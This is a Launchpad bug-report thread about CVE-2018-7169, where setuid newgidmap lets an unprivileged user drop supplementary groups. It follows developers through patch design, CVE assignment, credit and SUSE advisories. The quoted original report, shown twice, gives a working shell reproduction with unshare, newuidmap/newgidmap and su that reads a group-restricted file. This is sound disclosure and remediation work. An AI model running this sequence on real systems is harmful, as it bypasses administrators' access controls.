[Read more...](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/13)

This sounds acceptable to me. Issues or (even better) PRs against
github.com/shadow-maint/shadow would be great :)
Indeed the default should be the more permissible. (I won't accept
patches which require changes to the container runtime.)
On Mon, Jan 15, 2018 at 9:13 AM, Akihiro Suda <suda.kyoto@gmail.com> wrote:
>> And we define flags "allow\_setgroups" and "deny\_setgrouops" (with
> "deny\_setgroups" being the default).
>
>
> I think allow\_setgropus should be the default for keeping compatibility.
>
> However, useradd(8) may print warning for the default configuration.
>
> --
> You received this bug notification because you are subscribed to the bug
> report.
> https://bugs.launchpad.net/bugs/1729357
>
> Title:
> unprivileged user can drop supplementary groups
>
> Status in shadow package in Ubuntu:
> Confirmed
>
> Bug description:
> Distribution: Ubuntu 16.04.3 LTS
> Kernel: 4.4.0-97-generic
> uidmap package version: 1:4.2-3.1ubuntu5.3
>
> The newgidmap setuid executable allows any user to write a single
> mapping line to the gid\_map of a process whose identity is the same as
> the calling process, as long as that mapping line maps the process's
> own GID outside of the user namespace to GID 0 inside the user
> namespace.
>
> Newgidmap will write the mapping regardless of the content of
> /proc/$process\_being\_mapped/setgroups, which will initially contain
> the string "allow". After this mapping is performed, and also after
> the process' uid\_map is written with newuidmap, the process in the
> user namespace will be able to use the setgroups system call to drop
> supplementary groups.
>
> This is possible even if there is no entry for the user in
> /etc/subgid, because no subordinate GIDs are actually being used.
>
> This allows any user to circumvent the use of supplementary groups as
> blacklists, e.g. for some file owned by root:blacklist with permission
> bits 0604 (octal). Normally any process whose identity included the
> group "blacklist" in its supplementary groups would not be able to
> read that file. By performing this exploit using newgidmap, they can
> drop all supplementary groups and read that file.
>
> If newgidmap was not available, unprivileged users would not be able
> to write a process's gid\_map until writing "deny" to
> /proc/$pid/setgroups. A fix for this might be for newgidmap to check
> the content of /proc/$process\_being\_mapped/setgroups is "deny", but we
> have not tried to patch this ourselves.
>
> An example using 2 login shells for a user named "someone" on Ubuntu
> Xenial, with the uidmap package installed:
>
> Shell 1
>
> someone@ubuntu-xenial:~$ id
> uid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)
>
> someone@ubuntu-xenial:~$ ls -al /tmp/should\_restrict
> -rw----r-- 1 root restricted 8 Nov 1 12:23 /tmp/should\_restrict
>
> someone@ubuntu-xenial:~$ cat /tmp/should\_restrict
> cat: /tmp/should\_restrict: Permission denied
>
> someone@ubuntu-xenial:~$ unshare -U --setgroups allow #
> /proc/self/setgroups already contains 'allow', but let's be explicit
>
> nobody@ubuntu-xenial:~$ echo $$
> 1878
>
> Shell 2
>
> someone@ubuntu-xenial:~$ cat /etc/subuid
> lxd:100000:65536
> root:100000:65536
> ubuntu:165536:65536
>
> someone@ubuntu-xenial:~$ cat /etc/subgid
> lxd:100000:65536
> root:100000:65536
> ubuntu:165536:65536
>
> # There are no entries in /etc/sub{u,g}id for someone, but this
> doesn't matter that much as subordinate IDs are not being requested.
>
> someone@ubuntu-xenial:~$ newuidmap 1878 0 1001 1
>
> someone@ubuntu-xenial:~$ newgidmap 1878 0 1001 1
>
> Back to shell 1
>
> nobody@ubuntu-xenial:~$ id
> uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
>
> # The presence of the "nogroup" supplementary group indicates that
> some unmapped GIDs are present as supplementary GIDs. The kernel knows
> that this process still has "restricted" in its supplementary groups,
> so it can't read the restricted file yet.
>
> nobody@ubuntu-xenial:~$ cat /tmp/should\_restrict
> cat: /tmp/should\_restrict: Permission denied
>
> # The process has gained CAP\_SETGID in its user namespace by becoming
> UID 0. /proc/$pid/setgroups contains "allow", so it can call
> setgroups(2). By su-ing to root (itself, in the user namespace), it
> can drop the supplementary groups. It can't read /root/.bashrc as that
> file is owned by UID 0 in the initial user namespace, which creates
> some distracting error output but doesn't matter in this case.
>
> nobody@ubuntu-xenial:~$ su root
> su: Authentication failure
> (Ignored)
> bash: /root/.bashrc: Permission denied
>
> # Supplementary groups have been dropped
>
> root@ubuntu-xenial:~# id
> uid=0(root) gid=0(root) groups=0(root)
>
> # It can read the restricted file
>
> root@ubuntu-xenial:~# cat /tmp/should\_restrict
> content
>
> To manage notifications about this bug go to:
> https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+subscriptions

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-01-15: |  |  | [#14](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/14) |
| --- | --- | --- | --- |

Serge: I will submit a patch later today. However, I just thought that it's probably better that "allow\_setgroups" should be "ignore\_setgroups" and we retain the current behaviour (we don't write anything to /proc/$pid/setgroups) -- which allows a user (or runtime) to explicitly disable setgroups even if they would normally have the right to use setgroups.

Does that sound okay to you? I will make the default ignore\_setgroups, but IMO we should change the default for `useradd` to (by default) set deny\_setgroups.

Serge: I will submit a patch later today. However, I just thought that it's probably better that "allow\_setgroups" should be "ignore\_setgroups" and we retain the current behaviour (we don't write anything to /proc/$pid/setgroups) -- which allows a user (or runtime) to explicitly disable setgroups even if they would normally have the right to use setgroups.
Does that sound okay to you? I will make the default ignore\_setgroups, but IMO we should change the default for `useradd` to (by default) set deny\_setgroups.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-01-15: |  |  | [#15](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/15) |
| --- | --- | --- | --- |

Oh, and we should definitely get a CVE assigned IMO.

Oh, and we should definitely get a CVE assigned IMO.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Akihiro Suda (suda-kyoto)](https://launchpad.net/~suda-kyoto) wrote on 2018-02-15: |  |  | [#16](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/16) |
| --- | --- | --- | --- |

@cyphar

Did you submit patch/CVE?

@cyphar
Did you submit patch/CVE?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-15: |  |  | [#17](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/17) |
| --- | --- | --- | --- |

I had a preliminary patch written, but it was getting quite complicated (shadow's codebase is much more complicated than I expected -- and the /etc/subgid parsing code is intertwined with the parsing code for all of the other /etc/... files). I am working on it though.

I've also email the SUSE Security team about getting a CVE assigned, though I'm not sure if it's better that we get it assigned or that the Ubuntu folks get it assigned.

I had a preliminary patch written, but it was getting quite complicated (shadow's codebase is much more complicated than I expected -- and the /etc/subgid parsing code is intertwined with the parsing code for all of the other /etc/... files). I am working on it though.
I've also email the SUSE Security team about getting a CVE assigned, though I'm not sure if it's better that we get it assigned or that the Ubuntu folks get it assigned.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-15: |  |  | [#18](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/18) |
| --- | --- | --- | --- |

I've just sent a request for a CVE. I'm working on the patch now. My current plan is that allow\_setgroups will be the default for all mappings that are present in /etc/subgid -- but any "implicit" mappings (like mapping your own group) will be deny\_setgroups by default (because that's the biggest security issue coming out of this bug -- that \*any\* user can drop groups, not just the ones with subgids set up).

I've just sent a request for a CVE. I'm working on the patch now. My current plan is that allow\_setgroups will be the default for all mappings that are present in /etc/subgid -- but any "implicit" mappings (like mapping your own group) will be deny\_setgroups by default (because that's the biggest security issue coming out of this bug -- that \*any\* user can drop groups, not just the ones with subgids set up).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2018-02-15: |  |  | [#19](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/19) |
| --- | --- | --- | --- |

On Thu, Feb 15, 2018 at 11:29:03AM -0000, Aleksa Sarai wrote:

> I've just sent a request for a CVE. I'm working on the patch now. My

I assume the CVE will at least be correctly attributed to Craig.

Christian

On Thu, Feb 15, 2018 at 11:29:03AM -0000, Aleksa Sarai wrote:
> I've just sent a request for a CVE. I'm working on the patch now. My
I assume the CVE will at least be correctly attributed to Craig.
Christian

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-15: |  |  | [#20](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/20) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/20/%2Bdownload) (5.0 KiB)

Yes, of course. "Craig Furman (Pivotal)" is in the credits. I also

added Akihiro Suda (for suggesting him that it was a newgidmap bug)

and myself (for working on a fix for it), but if Craig prefers I can

just make him the only credit.

On Thu, Feb 15, 2018 at 11:00 PM, Christian Brauner

<email address hidden> wrote:

> On Thu, Feb 15, 2018 at 11:29:03AM -0000, Aleksa Sarai wrote:

>> I've just sent a request for a CVE. I'm working on the patch now. My

>

> I assume the CVE will at least be correctly attributed to Craig.

>

> Christian

>

> --

> You received this bug notification because you are subscribed to the bug

> report.

> <https://bugs.launchpad.net/bugs/1729357>

>

> Title:

> unprivileged user can drop supplementary groups

>

> Status in shadow package in Ubuntu:

> Confirmed

>

> Bug description:

> Distribution: Ubuntu 16.04.3 LTS

> Kernel: 4.4.0-97-generic

> uidmap package version: 1:4.2-3.1ubuntu5.3

>

> The newgidmap setuid executable allows any user to write a single

> mapping line to the gid\_map of a process whose identity is the same as

> the calling process, as long as that mapping line maps the process's

> own GID outside of the user namespace to GID 0 inside the user

> namespace.

>

> Newgidmap will write the mapping regardless of the content of

> /proc/$process\_being\_mapped/setgroups, which will initially contain

> the string "allow". After this mapping is performed, and also after

> the process' uid\_map is written with newuidmap, the process in the

> user namespace will be able to use the setgroups system call to drop

> supplementary groups.

>

> This is possible even if there is no entry for the user in

> /etc/subgid, because no subordinate GIDs are actually being used.

>

> This allows any user to circumvent the use of supplementary groups as

> blacklists, e.g. for some file owned by root:blacklist with permission

> bits 0604 (octal). Normally any process whose identity included the

> group "blacklist" in its supplementary groups would not be able to

> read that file. By performing this exploit using newgidmap, they can

> drop all supplementary groups and read that file.

>

> If newgidmap was not available, unprivileged users would not be able

> to write a process's gid\_map until writing "deny" to

> /proc/$pid/setgroups. A fix for this might be for newgidmap to check

> the content of /proc/$process\_being\_mapped/setgroups is "deny", but we

> have not tried to patch this ourselves.

>

> An example using 2 login shells for a user named "someone" on Ubuntu

> Xenial, with the uidmap package installed:

>

> Shell 1

>

> someone@ubuntu-xenial:~$ id

> uid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)

>

> someone@ubuntu-xenial:~$ ls -al /tmp/should\_restrict

> -rw----r-- 1 root restricted 8 Nov 1 12:23 /tmp/should\_restrict

>

> someone@ubuntu-xenial:~$ cat /tmp/should\_restrict

> cat: /tmp/should\_restrict: Permission denied

>

> someone@ubuntu-xenial:~$ unshare -U --setgroups allow #

> /proc/self/setgroups already contains 'allow', but let's be explicit

>

> nobody@ubuntu-xenial:~$ echo $$

> 1878

>

> Shell 2

>

> someone@ubuntu-xenia...

[Read more...](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/20)

Yes, of course. "Craig Furman (Pivotal)" is in the credits. I also
added Akihiro Suda (for suggesting him that it was a newgidmap bug)
and myself (for working on a fix for it), but if Craig prefers I can
just make him the only credit.
On Thu, Feb 15, 2018 at 11:00 PM, Christian Brauner
<christian.brauner@canonical.com> wrote:
> On Thu, Feb 15, 2018 at 11:29:03AM -0000, Aleksa Sarai wrote:
>> I've just sent a request for a CVE. I'm working on the patch now. My
>
> I assume the CVE will at least be correctly attributed to Craig.
>
> Christian
>
> --
> You received this bug notification because you are subscribed to the bug
> report.
> https://bugs.launchpad.net/bugs/1729357
>
> Title:
> unprivileged user can drop supplementary groups
>
> Status in shadow package in Ubuntu:
> Confirmed
>
> Bug description:
> Distribution: Ubuntu 16.04.3 LTS
> Kernel: 4.4.0-97-generic
> uidmap package version: 1:4.2-3.1ubuntu5.3
>
> The newgidmap setuid executable allows any user to write a single
> mapping line to the gid\_map of a process whose identity is the same as
> the calling process, as long as that mapping line maps the process's
> own GID outside of the user namespace to GID 0 inside the user
> namespace.
>
> Newgidmap will write the mapping regardless of the content of
> /proc/$process\_being\_mapped/setgroups, which will initially contain
> the string "allow". After this mapping is performed, and also after
> the process' uid\_map is written with newuidmap, the process in the
> user namespace will be able to use the setgroups system call to drop
> supplementary groups.
>
> This is possible even if there is no entry for the user in
> /etc/subgid, because no subordinate GIDs are actually being used.
>
> This allows any user to circumvent the use of supplementary groups as
> blacklists, e.g. for some file owned by root:blacklist with permission
> bits 0604 (octal). Normally any process whose identity included the
> group "blacklist" in its supplementary groups would not be able to
> read that file. By performing this exploit using newgidmap, they can
> drop all supplementary groups and read that file.
>
> If newgidmap was not available, unprivileged users would not be able
> to write a process's gid\_map until writing "deny" to
> /proc/$pid/setgroups. A fix for this might be for newgidmap to check
> the content of /proc/$process\_being\_mapped/setgroups is "deny", but we
> have not tried to patch this ourselves.
>
> An example using 2 login shells for a user named "someone" on Ubuntu
> Xenial, with the uidmap package installed:
>
> Shell 1
>
> someone@ubuntu-xenial:~$ id
> uid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)
>
> someone@ubuntu-xenial:~$ ls -al /tmp/should\_restrict
> -rw----r-- 1 root restricted 8 Nov 1 12:23 /tmp/should\_restrict
>
> someone@ubuntu-xenial:~$ cat /tmp/should\_restrict
> cat: /tmp/should\_restrict: Permission denied
>
> someone@ubuntu-xenial:~$ unshare -U --setgroups allow #
> /proc/self/setgroups already contains 'allow', but let's be explicit
>
> nobody@ubuntu-xenial:~$ echo $$
> 1878
>
> Shell 2
>
> someone@ubuntu-xenial:~$ cat /etc/subuid
> lxd:100000:65536
> root:100000:65536
> ubuntu:165536:65536
>
> someone@ubuntu-xenial:~$ cat /etc/subgid
> lxd:100000:65536
> root:100000:65536
> ubuntu:165536:65536
>
> # There are no entries in /etc/sub{u,g}id for someone, but this
> doesn't matter that much as subordinate IDs are not being requested.
>
> someone@ubuntu-xenial:~$ newuidmap 1878 0 1001 1
>
> someone@ubuntu-xenial:~$ newgidmap 1878 0 1001 1
>
> Back to shell 1
>
> nobody@ubuntu-xenial:~$ id
> uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
>
> # The presence of the "nogroup" supplementary group indicates that
> some unmapped GIDs are present as supplementary GIDs. The kernel knows
> that this process still has "restricted" in its supplementary groups,
> so it can't read the restricted file yet.
>
> nobody@ubuntu-xenial:~$ cat /tmp/should\_restrict
> cat: /tmp/should\_restrict: Permission denied
>
> # The process has gained CAP\_SETGID in its user namespace by becoming
> UID 0. /proc/$pid/setgroups contains "allow", so it can call
> setgroups(2). By su-ing to root (itself, in the user namespace), it
> can drop the supplementary groups. It can't read /root/.bashrc as that
> file is owned by UID 0 in the initial user namespace, which creates
> some distracting error output but doesn't matter in this case.
>
> nobody@ubuntu-xenial:~$ su root
> su: Authentication failure
> (Ignored)
> bash: /root/.bashrc: Permission denied
>
> # Supplementary groups have been dropped
>
> root@ubuntu-xenial:~# id
> uid=0(root) gid=0(root) groups=0(root)
>
> # It can read the restricted file
>
> root@ubuntu-xenial:~# cat /tmp/should\_restrict
> content
>
> To manage notifications about this bug go to:
> https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+subscriptions
--
Aleksa Sarai (cyphar)
www.cyphar.com

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Craig Furman (craigpivotal)](https://launchpad.net/~craigpivotal) wrote on 2018-02-15: |  |  | [#21](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/21) |
| --- | --- | --- | --- |

Thanks for the credit! I did highlight that the bug was in newgidmap in my initial report, by the way.

Aleksa, thanks for asking for a CVE? How did you go about this? This is new territory to me.

Thanks for the credit! I did highlight that the bug was in newgidmap in my initial report, by the way.
Aleksa, thanks for asking for a CVE? How did you go about this? This is new territory to me.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-15: |  |  | [#22](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/22) |
| --- | --- | --- | --- |

On Thu, Feb 15, 2018 at 11:30 PM, Craig Furman

<email address hidden> wrote:

> Thanks for the credit! I did highlight that the bug was in newgidmap in

> my initial report, by the way.

No problem -- you found the issue after all. Sorry for getting the timeline

wrong, did you want me to change the credits at all? It's your call.

> Aleksa, thanks for asking for a CVE? How did you go about this? This is

> new territory to me.

You just submit the online form at <https://cveform.mitre.org/>. You can also go

through the project if the project is registered with MITRE. (Canonical is

registered for example, but since this bug affects all distributions and not

just Ubuntu I felt it made more sense to just submit directly.)

There didn't appear to be any way for me to add you to Cc in the form (I could

only provide a single contact address), but I can forward the mails to you.

--

Aleksa Sarai (cyphar)

www.cyphar.com

On Thu, Feb 15, 2018 at 11:30 PM, Craig Furman
<1729357@bugs.launchpad.net> wrote:
> Thanks for the credit! I did highlight that the bug was in newgidmap in
> my initial report, by the way.
No problem -- you found the issue after all. Sorry for getting the timeline
wrong, did you want me to change the credits at all? It's your call.
> Aleksa, thanks for asking for a CVE? How did you go about this? This is
> new territory to me.
You just submit the online form at https://cveform.mitre.org/. You can also go
through the project if the project is registered with MITRE. (Canonical is
registered for example, but since this bug affects all distributions and not
just Ubuntu I felt it made more sense to just submit directly.)
There didn't appear to be any way for me to add you to Cc in the form (I could
only provide a single contact address), but I can forward the mails to you.
--
Aleksa Sarai (cyphar)
www.cyphar.com

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Craig Furman (craigpivotal)](https://launchpad.net/~craigpivotal) wrote on 2018-02-15: |  |  | [#23](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/23) |
| --- | --- | --- | --- |

It's really not a problem, I'm happy to leave it as it is.

It's really not a problem, I'm happy to leave it as it is.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-15: |  |  | [#24](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/24) |
| --- | --- | --- | --- |

<https://github.com/shadow-maint/shadow/pull/97> is my proposed patch. It currently only deals with the immediate security issue of allowing users that don't have

% echo "$(whoami):$(id -g):1" >> /etc/setgid

... set up. I've tested this with a couple of different setups and it appears to preserve behaviour when you're mapping subgid'd groups, but it restricts setgroups if the mapping is a fallback one. I was working on a patch for the flags code, but there's a lot of magic in the parsing code for that -- so I will work on that separately.

https://github.com/shadow-maint/shadow/pull/97 is my proposed patch. It currently only deals with the immediate security issue of allowing users that don't have
% echo "$(whoami):$(id -g):1" >> /etc/setgid
... set up. I've tested this with a couple of different setups and it appears to preserve behaviour when you're mapping subgid'd groups, but it restricts setgroups if the mapping is a fallback one. I was working on a patch for the flags code, but there's a lot of magic in the parsing code for that -- so I will work on that separately.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-16: |  |  | [#25](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/25) |
| --- | --- | --- | --- |

CVE-2018-7169 is assigned for this issue.

CVE-2018-7169 is assigned for this issue.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Kbabioch-b (kbabioch-b)](https://launchpad.net/~kbabioch-b) wrote on 2018-02-16: |  |  | [#26](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/26) |
| --- | --- | --- | --- |

CVE-2018-7169

An issue was discovered in shadow 4.5. newgidmap (in shadow-utils) is setuid and

allows an unprivileged user to be placed in a user namespace where setgroups(2)

is permitted. This allows an attacker to remove themselves from a supplementary

group, which may allow access to certain filesystem paths if the administrator

has used "group blacklisting" (e.g., chmod g-rwx) to restrict access to paths.

This flaw effectively reverts a security feature in the kernel (in particular,

the /proc/self/setgroups knob) to prevent this sort of privilege escalation.

References:

<http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-7169>

<http://www.cvedetails.com/cve/CVE-2018-7169/>

[https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357)

CVE-2018-7169
An issue was discovered in shadow 4.5. newgidmap (in shadow-utils) is setuid and
allows an unprivileged user to be placed in a user namespace where setgroups(2)
is permitted. This allows an attacker to remove themselves from a supplementary
group, which may allow access to certain filesystem paths if the administrator
has used "group blacklisting" (e.g., chmod g-rwx) to restrict access to paths.
This flaw effectively reverts a security feature in the kernel (in particular,
the /proc/self/setgroups knob) to prevent this sort of privilege escalation.
References:
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-7169
http://www.cvedetails.com/cve/CVE-2018-7169/
https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Kbabioch-b (kbabioch-b)](https://launchpad.net/~kbabioch-b) wrote on 2018-02-16: |  |  | [#27](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/27) |
| --- | --- | --- | --- |

SUSE:SLE-12:Update is not affected, since newgidmap was only introduced with 4.2.1. We still ship 4.1.5.1.

SUSE:SLE-12:Update is not affected, since newgidmap was only introduced with 4.2.1. We still ship 4.1.5.1.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Kbabioch-b (kbabioch-b)](https://launchpad.net/~kbabioch-b) wrote on 2018-02-16: |  |  | [#28](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/28) |
| --- | --- | --- | --- |

Fixed for Factory: sr#577189

Fixed for Factory: sr#577189

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Mvetter (mvetter)](https://launchpad.net/~mvetter) wrote on 2018-02-16: |  |  | [#29](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/29) |
| --- | --- | --- | --- |

Thanks for adding the patch.

SR accepted. Forwarded to Factory as SR#577204.

Thanks for adding the patch.
SR accepted. Forwarded to Factory as SR#577204.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Kbabioch-b (kbabioch-b)](https://launchpad.net/~kbabioch-b) wrote on 2018-02-16: |  |  | [#30](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/30) |
| --- | --- | --- | --- |

Didn't realize that we backported this feature to our SLE12 codestream. Applied the patch there, too: sr#155145

Didn't realize that we backported this feature to our SLE12 codestream. Applied the patch there, too: sr#155145

[Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar)
on 2018-02-19

| Changed in shadow (openSUSE): | |
| --- | --- |
| **importance**: | Undecided → Unknown |
| **status**: | New → Unknown |

[Bug Watch Updater (bug-watch-updater)](https://launchpad.net/~bug-watch-updater)
on 2018-02-19

| Changed in shadow (openSUSE): | |
| --- | --- |
| **importance**: | Unknown → Medium |
| **status**: | Unknown → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-19: |  |  | [#31](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/31) |
| --- | --- | --- | --- |

<https://github.com/shadow-maint/shadow/pull/99> includes the allow\_setgroups/deny\_setgroups feature that we discussed earlier.

https://github.com/shadow-maint/shadow/pull/99 includes the allow\_setgroups/deny\_setgroups feature that we discussed earlier.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Swamp-a (swamp-a)](https://launchpad.net/~swamp-a) wrote on 2018-03-12: |  |  | [#32](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/32) |
| --- | --- | --- | --- |

SUSE-SU-2018:0662-1: An update that fixes one vulnerability is now available.

Category: security (moderate)

Bug References: 1081294

CVE References: CVE-2018-7169

Sources used:

SUSE Linux Enterprise Server for Raspberry Pi 12-SP2 (src): shadow-4.2.1-27.6.1

SUSE Linux Enterprise Server 12-SP3 (src): shadow-4.2.1-27.6.1

SUSE Linux Enterprise Server 12-SP2 (src): shadow-4.2.1-27.6.1

SUSE Linux Enterprise Desktop 12-SP3 (src): shadow-4.2.1-27.6.1

SUSE Linux Enterprise Desktop 12-SP2 (src): shadow-4.2.1-27.6.1

SUSE CaaS Platform ALL (src): shadow-4.2.1-27.6.1

OpenStack Cloud Magnum Orchestration 7 (src): shadow-4.2.1-27.6.1

SUSE-SU-2018:0662-1: An update that fixes one vulnerability is now available.
Category: security (moderate)
Bug References: 1081294
CVE References: CVE-2018-7169
Sources used:
SUSE Linux Enterprise Server for Raspberry Pi 12-SP2 (src): shadow-4.2.1-27.6.1
SUSE Linux Enterprise Server 12-SP3 (src): shadow-4.2.1-27.6.1
SUSE Linux Enterprise Server 12-SP2 (src): shadow-4.2.1-27.6.1
SUSE Linux Enterprise Desktop 12-SP3 (src): shadow-4.2.1-27.6.1
SUSE Linux Enterprise Desktop 12-SP2 (src): shadow-4.2.1-27.6.1
SUSE CaaS Platform ALL (src): shadow-4.2.1-27.6.1
OpenStack Cloud Magnum Orchestration 7 (src): shadow-4.2.1-27.6.1

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Swamp-a (swamp-a)](https://launchpad.net/~swamp-a) wrote on 2018-03-13: |  |  | [#33](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/33) |
| --- | --- | --- | --- |

openSUSE-SU-2018:0667-1: An update that fixes one vulnerability is now available.

Category: security (moderate)

Bug References: 1081294

CVE References: CVE-2018-7169

Sources used:

openSUSE Leap 42.3 (src): shadow-4.2.1-13.1

openSUSE-SU-2018:0667-1: An update that fixes one vulnerability is now available.
Category: security (moderate)
Bug References: 1081294
CVE References: CVE-2018-7169
Sources used:
openSUSE Leap 42.3 (src): shadow-4.2.1-13.1

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2018-03-13: |  |  | [#34](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/34) |
| --- | --- | --- | --- |

@stgraber @mdeslaur - I'd considered making a release for Ubuntu... but this is the negative acl thing... Your opinions appreciated.

@stgraber @mdeslaur - I'd considered making a release for Ubuntu... but this is the negative acl thing... Your opinions appreciated.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Mvetter (mvetter)](https://launchpad.net/~mvetter) wrote on 2018-07-02: |  |  | [#35](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/35) |
| --- | --- | --- | --- |

I think this can be closed.

I think this can be closed.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Kbabioch-b (kbabioch-b)](https://launchpad.net/~kbabioch-b) wrote on 2018-07-16: |  |  | [#36](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/36) |
| --- | --- | --- | --- |

All updates released.

All updates released.

[Bug Watch Updater (bug-watch-updater)](https://launchpad.net/~bug-watch-updater)
on 2018-07-16

| Changed in shadow (openSUSE): | |
| --- | --- |
| **status**: | Confirmed → Fix Released |

[Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn)
on 2023-08-29

| Changed in shadow (Ubuntu): | |
| --- | --- |
| **importance**: | Undecided → Low |

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/shadow/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Remote bug watches

* [auto-bugzilla.opensuse.org #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294)

  [RESOLVED FIXED]
  [Edit](/bugs/1729357/%2Bwatch/127779 "Change watch details")

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
